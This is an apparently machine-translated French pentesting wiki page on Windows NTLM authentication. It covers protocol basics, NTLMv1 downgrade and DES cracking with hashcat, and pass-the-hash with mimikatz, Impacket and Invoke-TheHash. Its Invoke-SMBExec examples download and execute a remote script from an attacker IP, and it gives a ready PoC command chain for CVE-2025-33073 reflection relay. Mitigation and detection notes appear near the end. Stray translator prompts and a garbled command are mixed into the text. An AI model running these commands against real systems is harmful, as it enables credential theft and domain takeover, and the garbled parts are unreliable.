# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Informations de base

Dans les environnements où **Windows XP and Server 2003** sont utilisés, les hash LM (Lan Manager) sont employés, bien qu'il soit largement reconnu qu'ils peuvent être facilement compromis. Un hash LM particulier, `AAD3B435B51404EEAAD3B435B51404EE`, indique que LM n'est pas utilisé et représente le hash d'une chaîne vide.

Par défaut, le protocole d'authentification **Kerberos** est la méthode principale utilisée. NTLM (NT LAN Manager) intervient dans certaines circonstances : absence d'Active Directory, inexistence du domaine, dysfonctionnement de Kerberos dû à une mauvaise configuration, ou lorsque des connexions sont tentées à l'aide d'une adresse IP plutôt qu'avec un hostname valide.

La présence de l'en-tête **"NTLMSSP"** dans les paquets réseau indique un processus d'authentification NTLM.

La prise en charge des protocoles d'authentification - LM, NTLMv1 et NTLMv2 - est assurée par une DLL spécifique située à `%windir%\Windows\System32\msv1\_0.dll`.

**Points clés** :

- Les hash LM sont vulnérables et un hash LM vide (`AAD3B435B51404EEAAD3B435B51404EE`) indique qu'il n'est pas utilisé.
- Kerberos est la méthode d'authentification par défaut, tandis que NTLM n'est utilisé que dans certaines conditions.
- Les paquets d'authentification NTLM sont identifiables grâce à l'en-tête "NTLMSSP".
- Les protocoles LM, NTLMv1 et NTLMv2 sont pris en charge par le fichier système `msv1\_0.dll`.

## LM, NTLMv1 et NTLMv2

Vous pouvez vérifier et configurer le protocole qui sera utilisé :

### GUI

Exécutez _secpol.msc_ -> Stratégies locales -> Options de sécurité -> Network Security: LAN Manager authentication level. Il existe 6 niveaux (de 0 à 5).

![LM, NTLMv1 et NTLMv2 - GUI : exécutez secpol.msc - Stratégies locales - Options de sécurité - Network Security: LAN Manager authentication level. Il existe 6 niveaux (de 0 à 5)](<../../images/image (919).png>)

### Registry

Cela définira le niveau sur 5 :
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Valeurs possibles :
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Schéma d'authentification NTLM de domaine

1. L'**utilisateur** saisit ses **identifiants**
2. La machine cliente **envoie une requête d'authentification** en envoyant le **nom de domaine** et le **nom d'utilisateur**
3. Le **serveur** envoie le **challenge**
4. Le **client chiffre** le **challenge** en utilisant le hash du mot de passe comme clé, puis l'envoie comme réponse
5. Le **serveur envoie** au **contrôleur de domaine** le **nom de domaine, le nom d'utilisateur, le challenge et la réponse**. Si aucun **Active Directory** n'est configuré ou si le nom de domaine est le nom du serveur, les identifiants sont **vérifiés localement**.
6. Le **contrôleur de domaine vérifie que tout est correct** et envoie les informations au serveur

Le **serveur** et le **contrôleur de domaine** sont capables de créer un **Secure Channel** via le serveur **Netlogon**, car le contrôleur de domaine connaît le mot de passe du serveur (il se trouve dans la base de données **NTDS.DIT**).

### Schéma d'authentification NTLM local

L'authentification est la même que celle mentionnée **précédemment, mais** le **serveur** connaît le **hash de l'utilisateur** qui tente de s'authentifier, à l'intérieur du fichier **SAM**. Ainsi, au lieu de demander au contrôleur de domaine, le **serveur vérifie lui-même** si l'utilisateur peut s'authentifier.

### Challenge NTLMv1

La **longueur du challenge est de 8 octets** et la **réponse** fait **24 octets**.

Le **hash NT (16 octets)** est divisé en **3 parties de 7 octets chacune** (7B + 7B + (2B+0x00\*5)) : la **dernière partie est remplie de zéros**. Ensuite, le **challenge** est **chiffré séparément** avec chaque partie et les octets chiffrés **obtenus sont concaténés**. Total : 8B + 8B + 8B = 24 octets.

**Problèmes** :

- Manque de **randomness**
- Les 3 parties peuvent être **attaquées séparément** pour trouver le hash NT
- **DES est crackable**
- La 3e clé est toujours composée de **5 zéros**.
- Avec le **même challenge**, la **réponse** sera **identique**. Ainsi, vous pouvez donner à la victime comme **challenge** la chaîne "**1122334455667788**" et attaquer la réponse en utilisant des **rainbow tables pré-calculées**.

### Attaque NTLMv1

De nos jours, il devient moins courant de trouver des environnements avec une Unconstrained Delegation configurée, mais cela ne signifie pas que vous ne pouvez pas **abuser d'un service Print Spooler** configuré.

Vous pourriez abuser de certains identifiants/sessions que vous possédez déjà dans l'AD pour **demander à l'imprimante de s'authentifier** auprès d'un **host sous votre contrôle**. Ensuite, en utilisant `metasploit auxiliary/server/capture/smb` ou `responder`, vous pouvez **configurer le challenge d'authentification sur 1122334455667788**, capturer la tentative d'authentification et, si elle a été effectuée avec **NTLMv1**, vous pourrez le **crack**.\
Si vous utilisez `responder`, vous pouvez essayer **d'utiliser le flag `--lm`** pour tenter de **downgrade** l'**authentification**.\
_Notez que pour cette technique, l'authentification doit être effectuée avec NTLMv1 (NTLMv2 n'est pas valide)._

N'oubliez pas que l'imprimante utilisera le compte de l'ordinateur lors de l'authentification, et que les comptes d'ordinateur utilisent des mots de passe **longs et aléatoires** que vous **ne pourrez probablement pas cracker** avec des **dictionnaires** courants. Cependant, l'authentification **NTLMv1** utilise **DES** ([plus d'informations ici](#ntlmv1-challenge)), donc en utilisant des services spécialement dédiés au cracking de DES, vous pourrez le cracker (vous pouvez par exemple utiliser [https://crack.sh/](https://crack.sh) ou [https://ntlmv1.com/](https://ntlmv1.com)).

### Attaque NTLMv1 avec hashcat

NTLMv1 peut également être cassé avec le NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), qui formate les messages NTLMv1 d'une manière permettant de les casser avec hashcat.<sup>[[1]](#references)</sup>

La commande
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Please provide the content to translate.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the file name and the content to include.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Lancez hashcat (la distribution est préférable via un outil tel que hashtopolis), car cela prendra plusieurs jours autrement.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Dans ce cas, nous savons que le mot de passe est password, nous allons donc tricher à des fins de démonstration :
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Nous devons maintenant utiliser les hashcat-utilities pour convertir les clés DES crackées en parties du hash NTLM :
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Veuillez fournir le dernier extrait à traduire.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Veuillez fournir les textes à combiner.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### Challenge NTLMv2

**La longueur du challenge est de 8 octets** et **2 réponses sont envoyées** : l'une fait **24 octets** et la longueur de **l'autre est variable**.

**La première réponse** est créée en chiffrant avec **HMAC_MD5** la **chaîne** composée du **client et du domaine**, en utilisant comme **clé** le **hash MD4** du **NT hash**. Ensuite, le **résultat** est utilisé comme **clé** pour chiffrer le **challenge** avec **HMAC_MD5**. Un **client challenge de 8 octets** y est ajouté. Total : 24 o.

**La seconde réponse** est créée à partir de **plusieurs valeurs** (un nouveau client challenge, un **timestamp** pour éviter les **replay attacks**...)

Si vous disposez d'un **pcap ayant capturé un processus d'authentification réussi**, vous pouvez suivre ce guide pour obtenir le domaine, le nom d'utilisateur, le challenge et la réponse, puis essayer de **cracker le mot de passe** : [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**Une fois que vous avez le hash de la victime**, vous pouvez l'utiliser pour **vous faire passer pour elle**.\
Vous devez utiliser un **outil** qui va **effectuer** l'**authentification NTLM en utilisant** ce **hash**, **ou** vous pouvez créer une nouvelle **sessionlogon** et **injecter** ce **hash** dans **LSASS**, afin que, lorsqu'une **authentification NTLM est effectuée**, ce **hash soit utilisé.** C'est la dernière option qu'utilise mimikatz.

**N'oubliez pas que vous pouvez également effectuer des attaques Pass-the-Hash avec des comptes d'ordinateur.**

### **Mimikatz**

**Doit être exécuté en tant qu'administrateur**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Cela lancera un processus qui appartiendra aux utilisateurs ayant lancé mimikatz, mais en interne, dans LSASS, les identifiants enregistrés seront ceux présents dans les paramètres de mimikatz. Vous pourrez alors accéder aux ressources réseau comme si vous étiez cet utilisateur (similaire à l’astuce `runas /netonly`, mais sans avoir besoin de connaître le mot de passe en clair).

### Pass-the-Hash from linux

Vous pouvez obtenir l’exécution de code sur des machines Windows à l’aide de Pass-the-Hash depuis Linux.\
[**Access here to learn how to do it.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Outils Impacket compilés pour Windows

Vous pouvez télécharger[ les binaires impacket pour Windows ici](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Dans ce cas, vous devez spécifier une commande, cmd.exe et powershell.exe ne sont pas valides pour obtenir un shell interactif)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Il existe plusieurs autres binaires Impacket...

### Invoke-TheHash

Vous pouvez obtenir les scripts powershell ici : [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Cette fonction est un **mélange de toutes les autres**. Vous pouvez fournir **plusieurs hôtes**, en **exclure certains** et **sélectionner** l’**option** que vous souhaitez utiliser (_SMBExec, WMIExec, SMBClient, SMBEnum_). Si vous sélectionnez **SMBExec** ou **WMIExec**, mais que vous ne fournissez aucun paramètre _**Command**_, la fonction vérifiera simplement si vous disposez de **permissions suffisantes**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Doit être exécuté en tant qu'administrateur**

Cet outil fera la même chose que mimikatz (modifier la mémoire de LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Exécution distante manuelle de Windows avec un nom d'utilisateur et un mot de passe


{{#ref}}
../lateral-movement/
{{#endref}}

## Extraction d'identifiants depuis un hôte Windows

**Pour plus d'informations sur** [**la manière d'obtenir des identifiants depuis un hôte Windows, consultez cette page**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

L'Internal Monologue Attack est une technique furtive d'extraction d'identifiants qui permet à un attaquant de récupérer les hashes NTLM depuis la machine d'une victime **sans interagir directement avec le processus LSASS**. Contrairement à Mimikatz, qui lit directement les hashes en mémoire et qui est fréquemment bloqué par les solutions de sécurité des endpoints ou Credential Guard, cette attaque exploite des **appels locaux vers le package d'authentification NTLM (MSV1_0) via la Security Support Provider Interface (SSPI)**. L'attaquant commence par **rétrograder les paramètres NTLM** (par exemple, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) afin de s'assurer que NetNTLMv1 est autorisé. Il usurpe ensuite les tokens utilisateur existants obtenus depuis les processus en cours d'exécution et déclenche localement une authentification NTLM pour générer des réponses NetNTLMv1 à l'aide d'un challenge connu.<sup>[[4]](#references)</sup>

Après avoir capturé ces réponses NetNTLMv1, l'attaquant peut rapidement retrouver les hashes NTLM d'origine à l'aide de **rainbow tables précalculées**, ce qui permet de poursuivre avec des attaques Pass-the-Hash pour le mouvement latéral. Point crucial, l'Internal Monologue Attack reste furtive, car elle ne génère pas de trafic réseau, n'injecte pas de code et ne déclenche pas de dumps mémoire directs, ce qui la rend plus difficile à détecter pour les défenseurs que les méthodes traditionnelles comme Mimikatz.

Si NetNTLMv1 n'est pas accepté — en raison de politiques de sécurité imposées — l'attaquant peut ne pas parvenir à récupérer une réponse NetNTLMv1.

Pour gérer ce cas, l'outil Internal Monologue a été mis à jour : il acquiert dynamiquement un token serveur à l'aide de `AcceptSecurityContext()` afin de pouvoir tout de même **capturer des réponses NetNTLMv2** si NetNTLMv1 échoue. Bien que NetNTLMv2 soit beaucoup plus difficile à cracker, il ouvre toujours la voie à des relay attacks ou au brute-force hors ligne dans certains cas limités.

Le PoC est disponible à l'adresse **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay et Responder

**Consultez ici un guide plus détaillé sur la manière d'effectuer ces attaques :**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parser les challenges NTLM depuis une capture réseau

**Vous pouvez utiliser** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM et Kerberos *Reflection* via des SPN sérialisés (CVE-2025-33073)

Windows contient plusieurs mécanismes d'atténuation qui tentent d'empêcher les attaques de *reflection*, lors desquelles une authentification NTLM (ou Kerberos) provenant d'un hôte est relayée vers ce **même** hôte afin d'obtenir des privilèges SYSTEM.

Microsoft a bloqué la plupart des chaînes publiques avec MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) et les correctifs ultérieurs. Cependant, **CVE-2025-33073** montre que ces protections peuvent toujours être contournées en exploitant la manière dont le **client SMB tronque les Service Principal Names (SPN)** contenant des target-info *marshalled* (sérialisées).<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR du bug
1. Un attaquant enregistre un **enregistrement DNS A** dont le label encode un SPN marshalled — par exemple :
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. La victime est contrainte de s'authentifier auprès de ce hostname (PetitPotam, DFSCoerce, etc.).
3. Lorsque le client SMB transmet la chaîne cible `cifs/srv11UWhRCAAAAA…` à `lsasrv!LsapCheckMarshalledTargetInfo`, l'appel à `CredUnmarshalTargetInfo` **supprime le blob sérialisé**, laissant **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (ou l'équivalent Kerberos) considère alors la cible comme étant *localhost*, car la partie courte du hostname correspond au nom de l'ordinateur (`SRV1`).
5. Par conséquent, le serveur définit `NTLMSSP_NEGOTIATE_LOCAL_CALL` et injecte le **token d'accès SYSTEM de LSASS** dans le contexte (pour Kerberos, une clé de sous-session marquée SYSTEM est créée).
6. Relayer cette authentification avec `ntlmrelayx.py` **ou** `krbrelayx.py` donne les droits SYSTEM complets sur le même hôte.<sup>[[5]](#references)</sup>

### PoC rapide
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Correctif et mitigations
* Le correctif KB pour **CVE-2025-33073** ajoute une vérification dans `mrxsmb.sys::SmbCeCreateSrvCall` qui bloque toute connexion SMB dont la cible contient des informations marshalled (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Activer la **signature SMB** afin d'empêcher la réflexion, même sur les hôtes non patchés.
* Surveiller les enregistrements DNS ressemblant à `*<base64>...*` et bloquer les vecteurs de coercion (PetitPotam, DFSCoerce, AuthIP...).

### Idées de détection
* Captures réseau contenant `NTLMSSP_NEGOTIATE_LOCAL_CALL` lorsque l'IP du client ≠ l'IP du serveur.
* AP-REQ Kerberos contenant une clé de sous-session et un principal client égal au hostname.
* Événements Windows 4624/4648 indiquant des logons SYSTEM, immédiatement suivis d'écritures SMB distantes depuis le même hôte.<sup>[[5]](#references)</sup>

Pour la variante de **local reflection** de mars 2026, qui abuse des **ports arbitraires SMB** et de la **réutilisation des connexions TCP** pour atteindre `NT AUTHORITY\SYSTEM`, voir :

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Références
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Cracking an NTLMv2 Hash](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
